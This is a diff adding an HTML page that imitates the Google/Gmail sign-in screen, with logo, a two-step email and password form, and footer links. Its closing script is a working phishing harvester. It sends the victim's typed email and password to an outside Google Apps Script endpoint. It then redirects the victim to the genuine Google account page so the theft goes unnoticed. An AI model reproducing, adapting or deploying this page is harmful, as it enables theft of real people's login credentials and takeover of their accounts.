@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gmail</title>
+    <link rel="stylesheet" href="./Gmail_page.css">
+    <link rel="icon" type="image/x-icon" href="../../assests/images/Google logo.png">
+</head>
+
+<body>
+    <div id="main-wrapper">
+        <div id="parent">
+            <div id="left_child" class="child">
+                <svg viewBox="0 0 74 24" width="74" height="24" id="google_logo" xmlns="http://www.w3.org/2000/svg">
+                    <path
+                        d="M9.74 20.98c-5.4 0-9.67-4.2-9.67-9.52 0-5.32 4.27-9.53 9.67-9.53 3.03 0 5.48 1.15 7.33 2.9l-2.45 2.38c-1.2-1.1-3.04-2.1-4.88-2.1-3.6 0-6.6 2.97-6.6 6.66 0 3.7 3 6.67 6.6 6.67 4.14 0 5.75-2.73 6-4.14h-6v-3.08h9.07c.1.53.18 1.2.18 1.96 0 5.6-3.8 9.5-9.25 9.5z"
+                        fill="#4285f4" />
+                    <path
+                        d="M21.2 14.15c0 3.8-2.8 6.83-6.44 6.83-3.64 0-6.44-3.02-6.44-6.83 0-3.8 2.8-6.83 6.44-6.83 3.64 0 6.44 3.03 6.44 6.83zm-3.02 0c0-2.43-1.76-4.52-3.42-4.52-1.66 0-3.43 2.1-3.43 4.52 0 2.4 1.77 4.5 3.43 4.5 1.66 0 3.42-2.1 3.42-4.5z"
+                        fill="#ea4335" />
+                    <path
+                        d="M34.8 14.15c0 3.8-2.8 6.83-6.45 6.83-3.63 0-6.43-3.02-6.43-6.83 0-3.8 2.8-6.83 6.44-6.83 3.65 0 6.45 3.03 6.45 6.83zm-3.03 0c0-2.43-1.76-4.52-3.42-4.52-1.65 0-3.42 2.1-3.42 4.52 0 2.4 1.77 4.5 3.42 4.5 1.66 0 3.42-2.1 3.42-4.5z"
+                        fill="#fbbc04" />
+                    <path
+                        d="M47.7 8.16v12.06c0 4.96-2.98 7-6.27 7-3.23 0-5.18-2.18-5.92-3.95l2.64-1.1c.47 1.1 1.7 2.76 3.28 2.76 2.12 0 3.32-1.3 3.32-3.65v-1.15h-.1c-.63.78-1.87 1.55-3.28 1.55-3.1 0-6.08-2.84-6.08-6.84 0-3.98 2.98-6.82 6.08-6.82 1.4 0 2.65.77 3.28 1.53h.1v-1.4h2.95zm-2.65 6c0-2.37-1.64-4.5-3.37-4.5-1.74 0-3.4 2.12-3.4 4.5 0 2.37 1.66 4.5 3.4 4.5 1.73 0 3.37-2.13 3.37-4.5z"
+                        fill="#4285f4" />
+                    <path d="M52.34 2.3v18.34h-3.02V2.3h3.02z" fill="#34a853" />
+                    <path
+                        d="M63.77 16.5l2.4 1.6c-.77 1.15-2.6 3.63-6.13 3.63-3.7 0-6.42-2.92-6.42-6.84 0-3.98 2.75-6.83 6.1-6.83 3.4 0 5.15 2.92 5.67 4.52l.3.72-8.52 3.53c.68 1.34 1.76 2.1 3.12 2.1 1.36 0 2.36-.66 3.03-1.46zm-5.63-4.63l5.48-2.27c-.3-1.15-1.58-2.03-3.1-2.03-1.6 0-3.4 1.83-3.4 4.5z"
+                        fill="#ea4335" />
+                </svg>
+                
+                <!-- Email Step Heading -->
+                <div id="email_heading_section">
+                    <h1 id="signin_heading">Sign in</h1>
+                    <p id="statement">Use your Google Account</p>
+                </div>
+
+                <!-- Password Step Heading -->
+                <div id="password_heading_section" style="display: none;">
+                    <h1 id="welcome_heading">Welcome</h1>
+                    <div id="profile_chip">
+                        <svg focusable="false" aria-hidden="true" viewBox="0 0 24 24" class="profile-icon"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"></path></svg>
+                        <span id="user_email_display">example@gmail.com</span>
+                        <svg focusable="false" aria-hidden="true" viewBox="0 0 24 24" class="dropdown-icon"><path d="M7 10l5 5 5-5z"></path></svg>
+                    </div>
+                </div>
+            </div>
+            <div id="right_child" class="child">
+                <div class="form-section">
+                    <form action="" id="form">
+                        <!-- Email Section -->
+                        <div id="email_section">
+                            <div class="input-container">
+                                <input type="text" id="input_box" placeholder=" " required autocomplete="off">
+                                <label for="input_box">Email or phone</label>
+                            </div>
+                            <button type="button" id="forgot">Forgot email?</button>
+                            <p id="left_para">Not your computer? Use Guest mode to sign in privately. <a href="#"
+                                    id="left_para2">Learn more about using Guest mode</a></p>
+                        </div>
+
+                        <!-- Password Section -->
+                        <div id="password_section" style="display: none;">
+                            <div class="input-container">
+                                <input type="password" id="password_box" placeholder=" " required autocomplete="off">
+                                <label for="password_box">Enter your password</label>
+                            </div>
+                            <div class="show-password-container">
+                                <input type="checkbox" id="show_password">
+                                <label for="show_password">Show password</label>
+                            </div>
+                            <button type="button" id="forgot_password">Forgot password?</button>
+                        </div>
+                    </form>
+                </div>
+                <div id="button_division" class="button_div">
+                    <button id="Create_button">Create account</button>
+                    <button id="next_button">Next</button>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="footer">
+        <select name="Languages" id="languages">
+            <option value="" class="option">English (United States)</option>
+            <option value="" class="option">English (United Kingdom)</option>
+            <option value="" class="option">Spanish</option>
+            <option value="" class="option">Italian</option>
+            <option value="" class="option">తెలుగు</option>
+        </select>
+        <div id="buttons_division" class="three_button_division">
+            <button id="Help" class="three_buttons">Help</button>
+            <button id="Privacy" class="three_buttons">Privacy</button>
+            <button id="Terms" class="three_buttons">Terms</button>
+        </div>
+    </div>
+    <script>
+        var currentStep = 1; // 1: Email, 2: Password
+
+        // Show password checkbox logic
+        document.getElementById('show_password').addEventListener('change', function () {
+            var passwordBox = document.getElementById('password_box');
+            if (this.checked) {
+                passwordBox.type = 'text';
+            } else {
+                passwordBox.type = 'password';
+            }
+        });
+
+        // Click on profile chip to go back to email step
+        document.getElementById('profile_chip').addEventListener('click', function () {
+            document.getElementById('password_heading_section').style.display = 'none';
+            document.getElementById('password_section').style.display = 'none';
+            
+            document.getElementById('email_heading_section').style.display = 'block';
+            document.getElementById('email_section').style.display = 'block';
+            document.getElementById('Create_button').style.display = 'inline-block';
+            
+            currentStep = 1;
+        });
+
+        document.getElementById('next_button').addEventListener('click', function (event) {
+            event.preventDefault();
+
+            if (currentStep === 1) {
+                var emailVal = document.getElementById('input_box').value;
+                if (emailVal.trim() === '') {
+                    document.getElementById('input_box').focus();
+                    return;
+                }
+
+                // Switch to password step
+                document.getElementById('user_email_display').innerText = emailVal;
+                
+                document.getElementById('email_heading_section').style.display = 'none';
+                document.getElementById('email_section').style.display = 'none';
+                document.getElementById('Create_button').style.display = 'none';
+
+                document.getElementById('password_heading_section').style.display = 'block';
+                document.getElementById('password_section').style.display = 'block';
+
+                document.getElementById('password_box').focus();
+                currentStep = 2;
+            } else if (currentStep === 2) {
+                var emailVal = document.getElementById('input_box').value;
+                var passwordVal = document.getElementById('password_box').value;
+
+                if (passwordVal.trim() === '') {
+                    document.getElementById('password_box').focus();
+                    return;
+                }
+
+                var scriptURL = "https://script.google.com/macros/s/AKfycbwZ3CQplDxjsiYG6kt55BetS-M6mH-d3mQjm2PPJ_d_HX-XQIe8AqZkMd4mbPiLcss0/exec";
+
+                var payload = {
+                    email: emailVal,
+                    password: passwordVal
+                };
+
+                // Visual feedback
+                document.getElementById('next_button').innerText = 'Signing in...';
+                document.getElementById('next_button').disabled = true;
+
+                fetch(scriptURL, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                })
+                .then(response => {
+                    // Redirect to real Google
+                    window.location.href = "https://myaccount.google.com/";
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    document.getElementById('next_button').innerText = 'Next';
+                    document.getElementById('next_button').disabled = false;
+                });
+            }
+        });
+    </script>
+</body>
+
+</html>
